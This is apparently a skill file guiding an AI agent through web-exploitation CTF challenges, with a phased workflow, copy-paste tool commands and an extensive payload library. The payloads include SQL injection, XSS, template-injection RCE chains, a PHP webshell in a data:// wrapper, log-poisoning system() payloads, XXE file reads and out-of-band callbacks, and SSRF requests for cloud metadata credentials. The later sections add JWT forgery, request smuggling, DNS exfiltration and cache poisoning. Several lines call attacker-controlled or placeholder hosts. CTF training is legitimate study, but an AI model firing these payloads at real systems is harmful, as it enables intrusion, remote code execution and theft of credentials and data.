---
name: web-ctf
description: Web exploitation for CTFs — recon, SQLi/NoSQLi, XSS, SSTI, LFI/RFI, SSRF, XXE, deser, JWT, GraphQL, CMDi, upload, auth/logic
category: web
phase: 1-2
---
Execution policy: follow `skills/_shared/SKILL_CONTRACT.md`; separate evidence from inference, preserve scope, validate each link, and label uncertainty.
# Web-CTF Skill (Phases 1-2: Recon -> Exploit -> Handoff)
## Mental Model
Web CTFs are input-routing problems. Every query param, header, cookie, body field, file upload, JWT claim, and WebSocket message is a typed sink: SQL, NoSQL, template engine, OS shell, file path, URL fetcher, XML parser, deserializer, or auth check. The solver's job is NOT to spray payloads. It is to (1) fingerprint stack + sinks, (2) build a per-parameter fuzz matrix from response behavior, (3) diff responses to classify reflection vs execution, (4) confirm ONE vuln class with a benign oracle, then (5) fire ONE gated exploit that reads the flag or yields RCE. Blind automation without a baseline burns request budget and trips WAF rate-limits.
Core principles:
- Fingerprint before fuzz: headers (`Server`, `X-Powered-By`), cookies (`session` Flask vs `PHPSESSID` vs `JSESSIONID`), error pages (Django debug vs Flask traceback vs PHP warnings vs Express stack), generator meta tags, `.git/HEAD`, WAF block pages.
- One variable at a time: change a single param, keep the rest as control. Diff status, length, timing, and rendered DOM.
- Oracle hierarchy: reflected arithmetic (`{{7*7}}` -> `49`) beats error text; boolean diff beats error text; time delay beats all when blind; OOB (Collaborator/interactsh) settles SSRF/XXE/blind-XSS.
- Negative tests are mandatory: send a provably-benign value and a provably-malformed value. If both give the same page, you have no signal — do not escalate.
- Gate the exploit: exactly one exploit step, <=120s, request-capped. If it fails, return to the matrix; do not stack exploits.
## Workflow
### Phase 1 — Baseline (read-only, <=60s, cap ~30 requests)
Goal: map attack surface without triggering WAF blocks.
1. Fetch `/` + `robots.txt` + `sitemap.xml` + `security.txt`. Record status, lengths, headers, cookies, redirects.
2. Run fingerprint tools (see Tool Table): `whatweb`, `wafw00f`, one dir-enum (`ffuf` OR `feroxbuster`, not both), `nikto` quick, `nuclei -severity low,medium` only if time permits.
3. Manually probe high-value paths: `/.git/HEAD`, `/.env`, `/api-docs`, `/swagger.json`, `/openapi.json`, `/graphql`, `/.well-known/`, `/server-status`, `/actuator`, `/console`, source maps (`*.js.map`), `Dockerfile`, `backup.zip`, `db.sqlite`.
4. Enumerate every input: GET/POST params, headers (`Host`, `X-Forwarded-Host`, `User-Agent`, `Referer`, `Accept-Language`), cookies, file uploads, WebSocket messages, GraphQL args. Write `inputs.json`: name, method, location, sample value, reflected?
5. Save baseline responses to `artifacts/web/baseline/` for diffing.
`Reasoning Checkpoint`: baseline evidence (stack guess + WAF yes/no + input list) -> route (which vuln class first) -> next (Phase 2 oracle for top-2 params only).
### Phase 2 — Confirmation (benign oracles only, cap ~40 requests)
Goal: prove injectability per param WITHOUT damaging state. Fuzz matrix — for each of the top-3 params, send these classes in order, diffing against baseline:
1. Reflection: `XSSCHECK123`, `{{7*7}}`, `#{7*7}`, `${7*7}`, `<%=%>`.
2. SQL break: `'` then `"'` then `\` — look for 500/SQL keywords, NOT for data yet.
3. Boolean: `' AND '1'='1` vs `' AND '1'='2` (or numeric `AND 1=1/1=2`).
4. Time: `SLEEP(5)` / `pg_sleep(5)` / `'; WAITFOR DELAY '0:0:5'--` only if boolean was silent. Measure with `curl -w %{time_total}`.
5. Path: `../../../../etc/passwd` vs `....//....//etc/passwd` (read-only).
6. SSRF: point `url=`/`webhook=`/`avatar=` at your Collaborator/OOB host; confirm DNS/HTTP hit, do not pivot internal yet.
7. Template detect: `{{7*7}}` vs `{{7*'7'}}` (Jinja2 renders `49` vs `7777777`); `${7*7}` (FreeMarker/Velocity); `#{7*7}` (Pug/Ruby).
8. XXE: only if `Content-Type: application/xml` accepted — send benign internal entity (`<!ENTITY x "XXECHECK">`), no file read yet.
9. JWT: decode locally (`jwt_tool` decode-only), check `alg`, `kid`, `jku`/`x5u`. Do not forge yet.
Stop at first confirmed oracle per param. Record oracle type.
`Reasoning Checkpoint`: oracle evidence (reflected/executed/timed/OOB per param) -> route (single vuln class with strongest oracle) -> next (Phase 3 negative test for that class).
### Phase 3 — Negative (kill false positives, cap ~15 requests)
Goal: prove the oracle is causal, not coincidence.
1. Benign control: resend original valid value, confirm baseline page.
2. Broken control: send random non-payload (`zzqq99zz`) — must NOT trigger the oracle signal.
3. Encoding control: URL-double-encode the payload. If signal persists identically, suspect static reflection, not execution.
4. Type control: for SQL boolean, swap `1=1`/`1=2` polarity; pages must flip. For SSTI, `{{7*8}}` must give `56` not `49`. For time, `SLEEP(0)` must be fast.
5. Auth control: repeat the oracle logged-out / with fresh session. If signal requires auth, note it for the exploit step.
6. If ANY control fails: downgrade to `unconfirmed`, move to next param in matrix. Do not exploit unconfirmed oracles.
`Reasoning Checkpoint`: negative evidence (controls pass/fail) -> route (confirmed single sink vs back-to-matrix) -> next (ONE gated exploit iff confirmed).
### Phase 4 — Exploit, gated (ONE step, <=120s, cap ~20 requests)
Goal: one command that converts the confirmed sink into flag read or RCE. Pick exactly ONE payload chain from the Payload Library. Prefer read-only escalation (file read, table dump of flag-like rows) over shells. Reverse shells only if the task explicitly needs RCE and a shell handler is already listening. Stop timer at 120s regardless.
Examples by class: SQLi UNION -> `ORDER BY` count -> `UNION SELECT` flag-column hunt. SQLi blind -> `sqlmap --technique=B/T --batch`, dump one table. SSTI -> `tplmap/SSTImap --os-cmd 'id;cat flag*'` single command. LFI -> `php://filter/convert.base64-encode/resource=` single read. SSRF -> single metadata URL or Collaborator-confirmed pivot, no subnet sweep. XXE -> single `php://filter` b64 exfil entity. JWT -> single forged token, replay once. Upload -> single polyglot with marker, fetch back once. CMDi -> single `;id` with bypass, read output once.
`Reasoning Checkpoint`: exploit evidence (command, output excerpt, flag-pattern match yes/no) -> route (validate vs one alternate payload) -> next (Phase 5 handoff, never a second exploit loop).
### Phase 5 — Validation-handoff (read-only verify, no new exploit)
Goal: package a reproducible flag path for Lead/final validation.
1. Re-fetch the flag-bearing response with `curl`, save raw bytes to `artifacts/web/flagpath_<class>.txt` (headers + body + timing).
2. Confirm flag format (`flag{...}`, `CTF{...}`, `picoCTF{...}`) with `grep -E -o` — never paste full flag into chat/state beyond the handoff field.
3. Write `flagpath.json`: URL, method, param, payload class (NOT raw secret), oracle, tool+version, request count, elapsed.
4. Negative re-check: replay exploit WITHOUT payload, confirm flag disappears (proves causality).
5. Hand off: category `web`, confidence, artifact paths, exact replay command. Do not run further fuzzing.
`Reasoning Checkpoint`: validation evidence (replayable + causal) -> route (submit/validate skill) -> next (writeup; release worker slot).
## Tool Table (exact copy-paste commands)
| Purpose | Command |
|---|---|
| Fingerprint | `whatweb -v $URL` |
| WAF detect | `wafw00f $URL` |
| Dir enum (fast) | `ffuf -w /usr/share/wordlists/dirb/common.txt -u $URL/FUZZ -mc 200,301,302,403 -fs 0 -t 40 -timeout 8` |
| Dir enum (recursive) | `feroxbuster -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip,js -C 404 -t 30 --timeout 8 --no-recursion` |
| Dir enum (vhosts) | `gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 30` |
| Vuln scan (light) | `nikto -h $URL -Tuning 2,4 -timeout 8` |
| Template scan | `nuclei -u $URL -severity low,medium,high -c 25 -timeout 10 -retries 1` |
| Baseline fetch | `curl -sS -D headers.txt -o body.html -w 'code=%{http_code} size=%{size_download} time=%{time_total}\n' $URL` |
| Robots/sensitive | `curl -sS $URL/robots.txt; curl -sS $URL/.git/HEAD; curl -sS $URL/.env; curl -sS $URL/sitemap.xml` |
| API docs | `curl -sS $URL/openapi.json; curl -sS $URL/swagger.json; curl -sS $URL/api-docs` |
| GraphQL probe | `curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'` |
| SQLi auto (GET) | `sqlmap -u "$URL?id=1" --batch --level 2 --risk 1 --technique BEUSTQ -p id --dbs` |
| SQLi auto (POST) | `sqlmap -u "$URL/login" --data 'user=a&pass=b' --batch --level 3 --risk 1 -p user --technique BEUSTQ` |
| SQLi WAF bypass | `sqlmap -u "$URL?id=1" --batch --tamper=space2comment,randomcase,between --level 3 --risk 1` |
| SQLi dump one table | `sqlmap -u "$URL?id=1" --batch -D $DB -T $TABLE --dump --threads 2` |
| SQLi OS cmd (gated) | `sqlmap -u "$URL?id=1" --batch --os-shell` |
| XSS scan | `dalfox url "$URL?q=test"` (new CLI: `dalfox scan "$URL?q=test"`) |
| XSS blind | `dalfox url "$URL?q=test" --blind https://$OOB_HOST` |
| XSS custom payloads | `dalfox url "$URL?q=test" --custom-payload payloads.txt --only-custom-payload` |
| SSTI detect+exploit | `python3 tplmap.py -u "$URL?name=John"` |
| SSTI single cmd | `python3 tplmap.py -u "$URL?name=John" --os-cmd 'id'` |
| SSTImap detect | `python3 sstimap.py -u "$URL?name=test"` |
| SSTImap single cmd | `python3 sstimap.py -u "$URL?name=test" -S 'id'` |
| SSTImap read file | `python3 sstimap.py -u "$URL?name=test" -D '/etc/passwd' './passwd'` |
| SSTImap shell (gated) | `python3 sstimap.py -u "$URL?name=test" --os-shell` |
| JWT decode | `python3 jwt_tool.py $JWT` |
| JWT crack dict | `python3 jwt_tool.py $JWT -C -d /usr/share/wordlists/rockyou.txt` |
| JWT key-confusion | `python3 jwt_tool.py $JWT -X k -pk public.pem` |
| JWT sign HS256 | `python3 jwt_tool.py $JWT -S hs256 -p "$SECRET"` |
| JWT playbook scan | `python3 jwt_tool.py -t $URL -rc "jwt=$JWT" -M pb` |
| JWT hashcat crack | `hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt` |
| JWT hashcat rules | `hashcat -a 0 -m 16500 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule` |
| Flask decode | `flask-unsign --decode --cookie "$SESSION"` |
| Flask crack | `flask-unsign --unsign --cookie "$SESSION" --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval` |
| Flask sign | `flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'` |
| Timing measure | `curl -sS -o /dev/null -w '%{time_total}\n' "$URL?id=1 AND (SELECT 1 FROM pg_sleep(5))"` |
Env: set `URL`, `OOB_HOST` (Collaborator/interactsh), `JWT`, `SESSION`, `DB`, `TABLE` before pasting. Sources: `github.com/sqlmapproject/sqlmap`, `github.com/ffuf/ffuf`, `github.com/epi052/feroxbuster`, `github.com/hahwul/dalfox`, `github.com/epinna/tplmap`, `github.com/vladko312/SSTImap`, `github.com/ticarpi/jwt_tool`, `github.com/Paradoxis/Flask-Unsign`.
## Payload Library
SQLi — column count then union (MySQL-style):
```sql
' ORDER BY 1-- -
' ORDER BY 5-- -
' UNION SELECT 1,2,3,4,5-- -
' UNION SELECT 1,@@version,3,4,5-- -
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='flags'-- -
```
SQLi — error / boolean / time / stacked:
```sql
' AND EXTRACTVALUE(1,CONCAT(0x5c,@@version))-- -
' AND '1'='1
' AND '1'='2
1 AND 1=1-- -
1 AND 1=2-- -
'; SELECT pg_sleep(5)-- -
'; WAITFOR DELAY '0:0:5'-- -
1; SELECT SLEEP(5)-- -
```
NoSQLi (Mongo-style JSON + query-operator):
```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
{"user": {"$regex": "^adm"}, "pass": {"$ne": "x"}}
{"$where": "sleep(3000)"}
```
```http
user[$ne]=x&pass[$ne]=y
user[$regex]=^admin&pass[$gt]=
```
XSS — reflected / stored / DOM probes (confirm with dalfox, manual PoCs):
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
"><script>alert(1)</script>
';alert(1);//
javascript:alert(document.domain)
```
SSTI — detect polyglot (send once, diff):
```text
{{7*7}} ${7*7} #{7*7} *{7*7} <% 7*7 %>
{{7*'7'}} ${7*'7'}
```
SSTI — Jinja2 RCE ladder (use tplmap/SSTImap first; manual fallback):
```jinja2
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[400]('/etc/passwd').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
SSTI — Twig / FreeMarker:
```twig
{{ _self.env.setCache('ftp://attacker/x') }}{{ _self.env.loadTemplate('ssti') }}
{{ ['id']|filter('system') }}
```
```freemarker
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```
SSTI filter bypasses:
```jinja2
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f') }}
{{ ().__class__.__base__.__subclasses__() }}
{{ getattr(request.application, '\x5f\x5fglobals\x5f\x5f') }}
{% print config.items() %}
```
LFI / path traversal / wrappers (read-only first; filter-chain = chained `php://filter` converts to slip past extension/WAF checks):
```text
../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.iconv.UTF8.UTF7/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
expect://id
zip://uploads/shell.jpg%23shell.php
```
Log poisoning (gated, only after LFI confirmed):
```http
GET /index.php?page=/var/log/apache2/access.log&c=id
User-Agent: <?php system($_GET['c']); ?>
```
SSRF — canonical + bypasses:
```text
http://127.0.0.1:80/admin
http://0.0.0.0/ http://[::]/
http://2130706433/  http://0x7f.0.0.1/
http://127.1/ http://localhost./
http://attacker.com#@127.0.0.1/
http://127.0.0.1%09@attacker.com/
```
SSRF — cloud metadata (single-shot, correct header each):
```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/  (AWS, no header)
http://169.254.169.254/computeMetadata/v1/  (GCP, header Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure, header Metadata: true)
```
XXE — benign first, then file disclose / b64 exfil / XInclude (one doc per shot):
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "XXECHECK">]><r>&x;</r>
<!-- file disclose: --><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
<!-- b64 exfil: --><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&xxe;</r>
<!-- XInclude: --><r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></r>
<!-- OOB last resort: --><!DOCTYPE r [<!ENTITY % oob SYSTEM "http://$OOB_HOST/x"> %oob;]>
```
Deserialization — fingerprints (local decode first; never unpickle untrusted bytes directly):
```python
import pickletools, base64
pickletools.dis(base64.b64decode(COOKIE_B64))
```
```text
PHP: O:8:"stdClass":1:{s:4:"cmd";s:2:"id";}  |  phar://uploads/img.jpg/shell.txt
Java: Content-Type application/x-java-serialized-object, magic rO0AB (ysoserial chain gated: java -jar ysoserial.jar CommonsCollections6 'id' > p.ser)
Node: {"__proto__": {"polluted": "yes"}}  |  {"constructor": {"prototype": {"polluted": "yes"}}}  |  ?__proto__[polluted]=yes
```
JWT — manual (after jwt_tool decode):
```text
alg=none: strip signature, set {"alg":"none"}
HS/RS confusion: RS256 token verified with public key as HMAC secret
kid SQLi/path: {"kid": "' UNION SELECT 'x"} / {"kid": "../../key.pem"}
jku/x5u: point to attacker JWK, sign with attacker key
```
```bash
echo -n "$JWT" > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```
GraphQL — introspection / batching / depth:
```json
{"query": "{__schema{types{name}}}"}
{"query": "query{__typename}"}
{"query": "batch1: user(id:1){id} batch2: user(id:2){id}"}
{"query": "{ a0: __typename a1: __typename a2: __typename }"}
```
CMDi bypass tricks (gated single `id`):
```bash
;id
|id
$(id)
`id`
;${IFS}id
;{cat,/etc/passwd}
a|a&&id
%0aid
```
File upload polyglots (upload benign marker first, fetch back once):
```text
GIF89a <?php echo "UPLOADCHECK"; ?>
<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
Extensions: .php .phtml .phar .svg .htaccess | MIME: image/gif | magic: GIF89a
Double ext: shell.jpg.php | legacy null-ish: shell.php%00.jpg
```
Auth / logic — IDOR, OTP, race, reset, OAuth:
```http
GET /api/user/2 (iterate 1..5, compare with /api/user/1)
POST /reset {email: victim} + Host: attacker.com
X-Forwarded-Host: attacker.com (reset-link poisoning)
POST /otp {code: 0000} (batch 10 codes per request if allowed)
```
```bash
seq 1 5 | xargs -P5 -I{} curl -sS -b session=$S $URL/claim
```
## Decision Tree
```text
fingerprint (headers/cookies/errors/.git/WAF)
 +-- SQL errors / boolean flip / time delay --> SQLi (UNION->error->bool->time->sqlmap gated)
 +-- {{7*7}}==49 or engine error -----------> SSTI (tplmap/SSTImap --os-cmd id, ONE cmd)
 +-- reflection in HTML/JS attr ------------> XSS (dalfox confirm; stored? check trigger page)
 +-- ?page= / ?file= / wrappers ------------> LFI/RFI (php://filter b64 read; log-poison ONLY if confirmed)
 +-- url=/webhook=/avatar= + OOB hit -------> SSRF (metadata single-shot; bypasses if filtered)
 +-- XML accepted + entity reflected --------> XXE (file disclose b64; OOB last)
 +-- serialized blob / pickle / phar -------> DESER (local decode; ysoserial/phar gated, Node pollution probes)
 +-- JWT/session cookie ---------------------> JWT (alg none -> HS/RS -> kid -> jku -> crack -m 16500)
 +-- /graphql ------------------------------> GraphQL (introspection -> batching -> depth-DoS, capped)
 +-- ;|`|$() filtered but output -----------> CMDi (bypass ladder, single id)
 +-- upload + fetch-back -------------------> UPLOAD (polyglot marker; content-type/extension matrix)
 +-- /user/:id or OTP or reset -------------> AUTH/LOGIC (IDOR enum cap 10, OTP batch, race x5, Host-header)
 +-- none of the above ---------------------> expand fuzz matrix (headers/cookies/WS) or hand off blocked
```
Per-param fuzz matrix order (stop at first oracle): `reflect -> quote-break -> boolean -> time(1 shot) -> path -> OOB -> template -> xml -> jwt-decode`. Log every request (method+param+class+code+len+ms) in `matrix.csv`.
## AI Automation Notes (script, timeouts, caps)
What to script (worker):
- `recon.py`: curl baseline + robots/.git/.env/api-docs/graphql probes, writes `baseline/` + `inputs.json`. Timeout 60s total, 8s per request.
- `matrix.py`: per-param fuzz from Decision Tree, records `matrix.csv` (code/len/ms/hash). Cap 40 requests Phase 2, 15 Phase 3. Delay 300ms between requests; abort on 2x `429`/`403-block`.
- `diff.py`: length + `difflib` ratio vs baseline; flag boolean flips and `>=4s` timing deltas. Never eyeball raw HTML.
- `confirm.py`: polarity/time/encoding controls (Phase 3). Must pass 3/4 before exploit gate opens.
- `exploit_once.py`: single tool call with `timeout 120`, streams output to artifact, kills on timeout. No retry loop inside.
- Burp MCP: route all traffic via `http://127.0.0.1:8080` proxy for Repeater/Intruder-Sniper on ONE param, Collaborator for OOB. Scope to target host; Intruder pitchfork max 50 payloads, throttle 200ms.
- Playwright MCP: render JS-heavy pages, capture DOM + `localStorage`, drive login/OTP/upload flows, screenshot stored-XSS trigger pages. Headless, 30s page timeout, no auto-clicking destructive buttons.
Caps (hard): Phase 1 <=30 req / 60s; Phase 2 <=40 req; Phase 3 <=15 req; Phase 4 exactly 1 exploit / <=120s / <=20 req; total per-target <=120 req unless Lead raises. Stop conditions: WAF block page, `429` twice, session expiry, or 3 unconfirmed oracles -> mark `blocked`, hand off matrix.
Handoff artifact: `flagpath.json` + raw response + replay `curl` line. Technique-only: never include live target hostnames or real flags in skills/state; use `$URL` / `$OOB_HOST` placeholders.
## Advanced / Hard-Challenge Playbook
Hard web challenges are chains, not singles: 2-4 primitives behind a WAF, blind output, per-stage parsing differentials. Budget the whole chain (chain cap ~60 requests beyond the Phase 2 matrix). Rules: one hypothesis per probe, a correlation ID on every OOB payload, re-baseline after each successful stage (new cookie/role/internal hostname changes every downstream oracle).
### A1 — Chain: SSRF -> cloud metadata -> key -> JWT forgery
Generic shape: app fetches a user URL (avatar/webhook/importer/PDF renderer); metadata is reachable from app egress; a leaked secret becomes a JWT/session signing oracle.
1. Confirm SSRF blind FIRST: `url=https://$OOB_HOST/ssrf-<cid>` with a unique `<cid>` per probe. Require the DNS/HTTP callback before any internal pivot. No callback = no pivot.
2. Parser-differential bypass ladder if filtered (one variant per request, stop at first callback): `http://127.0.0.1/` -> `http://0x7f.0.0.1/` -> `http://2130706433/` -> `http://127.1/` -> `http://localhost./` -> `http://attacker.com#@127.0.0.1/` -> octal/hex/dword mixes. Verify EACH with an OOB callback; never assume the fetcher resolves it.
3. Metadata single-shots, correct header each (one request each, stop at first hit):
```http
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/  (AWS, no header)
GET http://169.254.169.254/computeMetadata/v1/  +  Metadata-Flavor: Google  (GCP)
GET http://169.254.169.254/metadata/instance?api-version=2021-02-01  +  Metadata: true  (Azure)
```
4. Convert the leak: temp credentials / exposed key file / SSRF-read `/.env` becomes (a) JWT HMAC secret (`jwt_tool -S hs256 -p`), (b) hosted JWKS for `jku`/`x5u` forgery, or (c) Flask secret for `flask-unsign --sign`. Decode locally first; forge exactly once per hypothesis.
5. Gate: whole A1 chain <=25 requests. Metadata unreachable after the ladder (no callback, no timing delta) -> abandon SSRF, return to matrix. Never subnet-sweep.
### A2 — WAF bypass grammars (case / parsing differentials)
Assume the WAF parses differently than the backend (multipart boundary continuation, JSON-vs-form dual parse, XML namespace quirks). One mutation per request:
1. Case + whitespace: `SeLeCt`, tabs/VT/FF between keywords, `/**/` comments, versioned comments (`/*!50000union*/`).
2. Content-Type swap: SAME payload as `application/json` vs `application/x-www-form-urlencoded` vs `multipart/form-data`. Many stacks accept form+multipart interchangeably while the WAF inspects only one. Diff which parse executes.
3. Multipart boundary games: duplicate `boundary=` params (naive WAF takes the first; frameworks may honor RFC 2231 continuation `boundary*0=`/`boundary*1=`); junk part before the real part; payload in `filename=` (`filename="x' OR 1=1-- -.jpg"`).
4. JSON shapes: duplicate keys (`{"id":"1","id":"' OR 1=1-- -"}` — first-wins vs last-wins differs per parser), unicode escapes (`\u0027` for `'`), deep nesting past WAF inspection depth.
5. HPP/HPF splits: `?id=1+union&id=/select+1,2,3` ; `?a=1+union/&b=/select+1` (fragment reassembly differs per stack).
6. sqlmap tampers as grammar, not spray: `--tamper=space2comment,randomcase,between` first; `charencode,base64encode` only if the backend provably decodes; custom tamper only after manual proof.
```bash
sqlmap -u "$URL?id=1" --batch --tamper=space2comment,randomcase --level 3 --risk 1 -p id
curl -sS -X POST $URL/api -H 'Content-Type: application/json' -d '{"id":"1 OR 1=1"}'
curl -sS -X POST $URL/api -H 'Content-Type: application/x-www-form-urlencoded' -d 'id=1 OR 1=1'
```
### A3 — HTTP request smuggling variants + header smuggling
Use when: CDN/proxy in front (detect via `Via`, `X-Cache`, `Server` mismatch), front-end ACL blocks `/admin` but backend may not, or WAF must be skipped entirely. Confirm with differential timing, never with destructive payloads.
| Variant | Shape | When to try |
|---|---|---|
| CL.TE | Front uses `Content-Length`, back uses `Transfer-Encoding` | Both headers accepted, TE hidden from front |
| TE.CL | Front uses TE, back uses `Content-Length` | Front forwards full chunked body |
| TE.TE | Both use TE, one can be tricked to ignore it | Obfuscate one TE (`Transfer-Encoding: chunked` vs `Transfer-Encoding: chunkedx`) |
| H2.CL / H2.TE | HTTP/2 front downgrades to HTTP/1 back | `:pseudo-headers` present, `Content-Length: 0` + body, or TE surviving downgrade |
| H2.0 / CL.0 / 0.CL | One side ignores length entirely | Endpoint gives early response; body bytes bleed into next request |
Obfuscation grammar (one per probe): duplicate CL/TE headers; `Transfer-Encoding: chunked` case/space mutations (`chunked `, `Chunked`); obs-fold (`Transfer-Encoding:\r\n chunked`); `Content-Length: 4` + `Content-Length: 6` pairs; absolute-URI request line; `Expect:` on OPTIONS (documented CDN quirk class).
```http
POST / HTTP/1.1
Host: $HOST
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: $HOST
```
Header smuggling (unkeyed-header class): `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-Url` override routing/redirects while the cache key ignores them. Probe: send benign header value, check response diff; poison only after confirming the header is unkeyed (cache HIT with attacker value reflected).
Safety: time-based confirm only (`delay` smuggled request, measure), max 10 smuggle probes per target, never smuggle state-changing methods on shared/live infra.
### A4 — Blind exfil via OOB / DNSlog / collaborator (correlation IDs)
For blind SQLi/XXE/SSTI/SSRF with no reflective output: every payload carries `cid=<rand8>`; the OOB listener log is the oracle.
```bash
interactsh-client -o out.json &  # or Burp Collaborator; record $OOB_HOST first
curl -sS "$URL?id=1' AND (SELECT 1 FROM pg_sleep(2))-- -" -w '%{time_total}\n'
curl -sS -X POST $URL/parse -H 'Content-Type: application/xml' -d '<!DOCTYPE r [<!ENTITY % oob SYSTEM "http://$OOB_HOST/xxe-<cid>"> %oob;]><r/>'
```
Rules: (1) unique `<cid>` per injection point AND per technique — reuse destroys causality; (2) poll OOB log with `grep <cid>`, record timestamp delta; (3) benign control `https://$OOB_HOST/ctl-<cid>` must also fire (proves egress, not injection); (4) exfil one byte/row per shot (`SUBSTRING(secret,<i>,1)` -> encode in subdomain label `d-<hex>.<cid>.$OOB_HOST`); (5) cap 30 OOB requests per secret; prefer timing oracle first, OOB only when timing is jittered (>500ms baseline noise).
DNS exfil label discipline: lowercase hex only, <=32 chars per label, total FQDN <=200 chars. If labels are mangled, fall back to HTTP-callback path exfil.
### A5 — Second-order injection
Stored now, executed later: payload lands in one feature (profile name, comment, cart note, uploaded CSV) and fires in another (admin panel, export job, nightly report, trigger page). Detection: submit marker `SOCHECK<cid>` in EVERY writable field, then crawl all read paths (own view, other-user view, admin view, export endpoints) grepping for the marker. Marker reflected elsewhere = second-order sink.
```bash
curl -sS -X POST $URL/api/profile -b session=$S -d 'displayName=SOCHECK<c1>{{7*7}}'
curl -sS $URL/admin/users -b session=$ADMIN_S | grep -o 'SOCHECK<c1>[^<]*'
```
Order of fire: (1) stored XSS: check trigger pages + Playwright render; (2) second-order SQLi: single-quote in stored field, observe error on the READ path, not the write path; (3) second-order SSTI/CSV-formula: `{{7*7}}` / `=cmd|'/c calc'!A0` in stored fields, confirm at render/export. Never mass-register users or spam admin queues: one marker per field, delete after (or note for cleanup), cap 20 store+read cycles.
### A6 — Race-condition window measurement
For coupon-claim/OTP/rate-limit/reset-token races: measure the window BEFORE racing. Steps:
1. Baseline latency: 10 sequential `curl -w %{time_total}` to the endpoint; record p50/p95. Window < p95 jitter is unraceable over the network — stop.
2. Single-packet technique: prepare N requests (N=5 default, max 10), release simultaneously (`xargs -P5`, or parallel `curl --parallel`), last-byte sync where the harness supports it. Goal: requests arrive within the same server-side tick.
3. Oracle: exactly one success is normal; >=2 successes with single-use semantics (one coupon, one OTP) = race won. Log all status codes + bodies; diff winners vs losers.
```bash
seq 1 5 | xargs -P5 -I{} curl -sS -b session=$S -w '{} code=%{http_code} time=%{time_total}\n' -o body_{}.txt $URL/claim
grep -l 'success\|claimed' body_*.txt
```
Caps: 5-wide default, 10-wide max, ONE burst per hypothesis, never loop bursts (lockout/DoS risk). If `429` after burst -> lockout, enter Failure-Mode F2 recovery, do not retry for 10 min.
### A7 — CSP bypass chains
Read the ENFORCING policy only (`Content-Security-Policy`, not `Report-Only`; merge multiple headers — browser enforces ALL). Chain order:
1. `unsafe-inline` present -> inline `<script>alert(1)</script>` / event handler directly.
2. `unsafe-eval` -> `eval()`-based payload.
3. Whitelisted host with JSONP/gadget endpoint -> `<script src="https://<allowed>/...?callback=<fn>">` (match callback param name to that endpoint).
4. `data:` in `script-src` -> `<script src="data:text/javascript,<code>">`.
5. `strict-dynamic` + nonce/hash -> DOM script-gadget or nonce-reuse ONLY if nonce is reflected/predictable (static nonce = reuse; per-response random = hardened, stop).
6. Missing `base-uri` -> `<base href="https://$OOB_HOST/">` hijacks relative script loads. Missing `object-src` -> `<object>/<embed>` fallback.
7. Trusted-Types enforced -> route through an allowed policy name; if none creatable, DOM-XSS sinks are dead — pivot to non-script impact (form hijack via HTML injection still counts as stored HTMLi).
```bash
curl -sSI $URL/page | grep -i '^content-security-policy'
nuclei -u "$URL/page" -t csp-bypass -dast -headless  # DAST CSP templates need -dast + headless; re-check --help
```
Report which directive failed (quote the header), not just "XSS works".
### A8 — Cache-poisoning -> stored-XSS escalation
Unkeyed input (header/query/cookie) reflected into a cacheable response = stored XSS for everyone hitting that cache key. Steps:
1. Find caches: `X-Cache: HIT/MISS`, `Age:`, `CF-Cache-Status`, `X-Served-By`. Confirm caching with a cache-buster pair (`?cb=<r1>` vs `?cb=<r2>` -> second identical request returns HIT).
2. Find unkeyed inputs: send `X-Forwarded-Host: u1.<cid>.tld` vs `u2`, `User-Agent` marker, `?utm_source=<marker>`; compare MISS bodies. Reflected but key varies -> keyed (dead). Reflected AND second request (no buster) returns HIT with marker -> poisonable.
3. Escalate minimal: first poison with benign marker (`POISON<cid>`), fetch WITHOUT buster to prove persistence; only then escalate to XSS probe (`<script>` per A7 CSP context). Parameter-cloaking variant: duplicate param where cache keys on first occurrence but app renders the last.
4. Do NOT poison destructive/DoS payloads on shared infra; prefer `Cache-Control: no-store` bypass check first; document TTL (`Age` delta) so validators know the window.
```bash
curl -sS "$URL/?cb=<r1>" -H 'X-Forwarded-Host: evil<cid>' -D - -o b1.html | grep -iE 'x-cache|age'
curl -sS "$URL/" -H 'X-Forwarded-Host: evil<cid>' | grep -o 'evil<cid>'
```
